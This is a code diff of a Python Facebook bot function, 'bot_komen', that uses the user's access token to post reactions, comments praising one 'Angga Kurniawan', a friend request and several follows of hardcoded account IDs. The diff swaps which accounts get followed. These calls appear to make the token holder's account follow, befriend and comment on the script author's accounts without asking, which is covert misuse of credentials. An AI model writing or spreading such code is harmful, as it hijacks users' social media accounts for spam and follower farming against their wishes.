@@ -143,11 +143,9 @@ def bot_komen():
     kom2 = 'ANGGA KURNIAWAN SANGAT KEREN EUY 😍'
     reac2 = ('LOVE')
     requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
-    requests.post('https://graph.facebook.com/638124327/subscribers?access_token=' + toket)
-    requests.post('https://graph.facebook.com/100027597829137/subscribers?access_token=' + toket)
+    requests.post('https://graph.facebook.com/1186995774/subscribers?access_token=' + toket)
     requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)
-    requests.post('https://graph.facebook.com/100002224561488/subscribers?access_token=' + toket)
-    requests.post('https://graph.facebook.com/100023409608118/subscribers?access_token=' + toket)
+    requests.post('https://graph.facebook.com/100000891392705/subscribers?access_token=' + toket)
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
